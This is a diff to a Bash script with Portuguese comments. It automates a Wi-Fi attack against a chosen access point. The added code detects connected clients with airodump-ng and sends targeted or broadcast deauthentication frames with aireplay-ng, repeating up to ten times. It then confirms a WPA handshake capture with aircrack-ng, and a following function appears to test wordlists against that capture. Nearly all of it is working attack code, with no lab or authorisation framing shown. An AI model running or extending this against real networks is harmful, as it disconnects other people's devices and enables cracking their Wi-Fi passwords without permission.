@@ -567,44 +567,126 @@ scan_networks() {
     fi
 }
 
+# Detectar clientes conectados ao AP
+detect_clients() {
+    local bssid="$1"
+    local channel="$2"
+    local clients=()
+    
+    echo -e "${CYAN}[*] Detectando clientes conectados ao AP...${NC}"
+    
+    # Escanear por 5 segundos para detectar clientes
+    local scan_file="/tmp/client_scan_$$"
+    timeout 5 airodump-ng -c "$channel" --bssid "$bssid" -w "$scan_file" "$MONITOR_INTERFACE" &> /dev/null
+    
+    # Parsear CSV para encontrar clientes
+    local csv_file="${scan_file}-01.csv"
+    if [[ -f "$csv_file" ]]; then
+        local in_stations=false
+        while IFS= read -r line; do
+            if [[ "$line" =~ ^Station ]]; then
+                in_stations=true
+                continue
+            fi
+            if [[ "$in_stations" == true ]]; then
+                local client_mac=$(echo "$line" | cut -d',' -f1 | tr -d ' ')
+                if [[ "$client_mac" =~ ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$ ]]; then
+                    clients+=("$client_mac")
+                fi
+            fi
+        done < "$csv_file"
+        rm -f "${scan_file}"*.csv "${scan_file}"*.kismet.csv &> /dev/null
+    fi
+    
+    echo "${clients[@]}"
+}
+
 # Capturar handshake automaticamente
 capture_handshake_auto() {
     echo -e "\n${BLUE}[*] Iniciando captura de handshake...${NC}"
     
     CAPTURE_FILE="${OUTPUT_DIR}/captura_${SELECTED_ESSID}_${TIMESTAMP}"
     
+    echo -e "${CYAN}[*] ESSID: $SELECTED_ESSID${NC}"
+    echo -e "${CYAN}[*] BSSID: $SELECTED_BSSID${NC}"
+    echo -e "${CYAN}[*] Canal: $SELECTED_CHANNEL${NC}"
     echo -e "${CYAN}[*] Arquivo: ${CAPTURE_FILE}.cap${NC}"
-    echo -e "${YELLOW}[*] Capturando handshake...${NC}\n"
+    echo ""
+    
+    # Detectar clientes conectados
+    local clients_str=$(detect_clients "$SELECTED_BSSID" "$SELECTED_CHANNEL")
+    local clients_array=($clients_str)
+    
+    if [[ ${#clients_array[@]} -gt 0 ]]; then
+        echo -e "${GREEN}[+] Encontrados ${#clients_array[@]} cliente(s) conectado(s)${NC}"
+        for client in "${clients_array[@]}"; do
+            echo -e "${CYAN}    - $client${NC}"
+        done
+    else
+        echo -e "${YELLOW}[!] Nenhum cliente detectado. Tentando deauth broadcast...${NC}"
+    fi
+    echo ""
     
     # Iniciar airodump-ng em background
+    echo -e "${GREEN}[+] Iniciando airodump-ng...${NC}"
     airodump-ng -c "$SELECTED_CHANNEL" --bssid "$SELECTED_BSSID" \
                 -w "$CAPTURE_FILE" "$MONITOR_INTERFACE" &> /dev/null &
     local airodump_pid=$!
     
-    sleep 3
+    # Aguardar airodump-ng inicializar
+    sleep 5
     
     # Tentar capturar handshake com deauth
-    local max_attempts=5
+    local max_attempts=10
     local attempt=1
     local handshake_captured=false
+    local cap_file="${CAPTURE_FILE}-01.cap"
+    
+    echo -e "${YELLOW}[*] Iniciando tentativas de captura de handshake...${NC}"
+    echo ""
     
     while [[ $attempt -le $max_attempts && "$handshake_captured" == false ]]; do
-        echo -e "${YELLOW}[*] Tentativa $attempt/$max_attempts: Executando deauth...${NC}"
+        echo -e "${CYAN}[*] Tentativa $attempt/$max_attempts${NC}"
         
         # Executar deauth
-        aireplay-ng --deauth 5 -a "$SELECTED_BSSID" "$MONITOR_INTERFACE" &> /dev/null
+        if [[ ${#clients_array[@]} -gt 0 ]]; then
+            # Atacar clientes específicos
+            for client_mac in "${clients_array[@]}"; do
+                echo -e "${YELLOW}    → Deauth no cliente: $client_mac${NC}"
+                aireplay-ng --deauth 3 -a "$SELECTED_BSSID" -c "$client_mac" "$MONITOR_INTERFACE" &> /dev/null &
+                sleep 1
+            done
+            # Aguardar processos de deauth terminarem
+            wait
+        else
+            # Deauth broadcast (todos os clientes)
+            echo -e "${YELLOW}    → Deauth broadcast (todos os clientes)${NC}"
+            aireplay-ng --deauth 10 -a "$SELECTED_BSSID" "$MONITOR_INTERFACE" &> /dev/null
+        fi
         
-        sleep 2
+        sleep 3
         
         # Verificar se handshake foi capturado
-        local cap_file="${CAPTURE_FILE}-01.cap"
         if [[ -f "$cap_file" ]]; then
-            local result=$(aircrack-ng "$cap_file" 2>&1 | grep -i "handshake\|1 handshake")
-            if [[ -n "$result" ]]; then
+            # Verificar com aircrack-ng
+            local aircrack_output=$(aircrack-ng "$cap_file" 2>&1)
+            local handshake_check=$(echo "$aircrack_output" | grep -iE "handshake|1 handshake|WPA.*handshake")
+            
+            if [[ -n "$handshake_check" ]]; then
                 handshake_captured=true
-                echo -e "${GREEN}[+] ✓ Handshake capturado com sucesso!${NC}"
+                echo ""
+                echo -e "${GREEN}[+] ✓✓✓ HANDSHAKE CAPTURADO COM SUCESSO! ✓✓✓${NC}"
+                echo -e "${GREEN}[+] Arquivo: $cap_file${NC}"
                 break
+            else
+                # Verificar tamanho do arquivo (se está crescendo, pode estar capturando)
+                local file_size=$(stat -c%s "$cap_file" 2>/dev/null || stat -f%z "$cap_file" 2>/dev/null)
+                if [[ -n "$file_size" && $file_size -gt 1000 ]]; then
+                    echo -e "${CYAN}    Arquivo capturado: ${file_size} bytes (aguardando handshake...)${NC}"
+                fi
             fi
+        else
+            echo -e "${YELLOW}    Arquivo de captura ainda não criado...${NC}"
         fi
         
         ((attempt++))
@@ -612,15 +694,38 @@ capture_handshake_auto() {
     done
     
     # Parar airodump-ng
+    echo ""
+    echo -e "${BLUE}[*] Parando airodump-ng...${NC}"
     kill $airodump_pid 2>/dev/null
     wait $airodump_pid 2>/dev/null
+    sleep 1
+    
+    # Verificação final
+    if [[ -f "$cap_file" ]]; then
+        local final_check=$(aircrack-ng "$cap_file" 2>&1 | grep -iE "handshake|1 handshake|WPA.*handshake")
+        if [[ -n "$final_check" ]]; then
+            handshake_captured=true
+        fi
+    fi
     
     if [[ "$handshake_captured" == false ]]; then
         echo -e "${RED}[!] Não foi possível capturar handshake após $max_attempts tentativas${NC}"
-        echo -e "${YELLOW}[*] Tentando continuar mesmo assim...${NC}"
+        echo -e "${YELLOW}[*] Possíveis causas:${NC}"
+        echo -e "${YELLOW}    - Nenhum cliente conectado à rede${NC}"
+        echo -e "${YELLOW}    - Rede muito distante (sinal fraco)${NC}"
+        echo -e "${YELLOW}    - AP não está respondendo ao deauth${NC}"
+        echo -e "${YELLOW}    - WPA3 (não suportado por este método)${NC}"
+        echo ""
+        echo -e "${YELLOW}[*] Tentando continuar mesmo assim (pode funcionar)...${NC}"
+        
+        if [[ ! -f "$cap_file" ]]; then
+            echo -e "${RED}[!] Arquivo de captura não foi criado${NC}"
+            return 1
+        fi
     fi
     
-    CAPTURE_FILE="${CAPTURE_FILE}-01.cap"
+    CAPTURE_FILE="$cap_file"
+    echo ""
 }
 
 # Testar wordlist individual
